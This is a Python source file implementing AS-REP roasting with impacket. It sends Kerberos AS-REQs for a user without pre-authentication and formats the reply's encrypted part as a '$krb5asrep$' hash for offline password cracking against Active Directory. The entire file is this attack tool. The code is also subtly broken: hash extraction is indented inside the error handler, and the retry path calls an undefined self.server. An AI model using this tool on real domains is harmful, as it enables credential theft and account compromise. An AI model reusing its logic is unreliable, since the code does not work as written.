from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime, random


class AsRepRoast():


    def __init__(self):
        pass


    def RepRoast(self, server: str, usr: list):

        hashes = []
        # Build request for Tickets
        clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        asReq = AS_REQ()
        domain = str(server).upper()
        serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        pacReq = KERB_PA_PAC_REQUEST()
        pacReq['include-pac'] = True
        encodedPacReq = encoder.encode(pacReq)
        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacReq

        requestBody = seq_set(asReq, 'req-body')

        options = list()
        options.append(constants.KDCOptions.forwardable.value)
        options.append(constants.KDCOptions.renewable.value)
        options.append(constants.KDCOptions.proxiable.value)
        requestBody['kdc-options'] = constants.encodeFlags(options)

        seq_set(requestBody, 'sname', serverName.components_to_asn1)
        seq_set(requestBody, 'cname', clientName.components_to_asn1)

        requestBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        requestBody['till'] = KerberosTime.to_asn1(now)
        requestBody['rtime'] = KerberosTime.to_asn1(now)
        requestBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(requestBody, 'etype', supportedCiphers)

        msg = encoder.encode(asReq)

        try:
            response = sendReceive(msg, domain, server)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(requestBody, 'etype', supportedCiphers)
                msg = encoder.encode(asReq)
                response = sendReceive(msg, domain, self.server)
            else:
                print(e)
                return None

            asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

            hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

        return hashes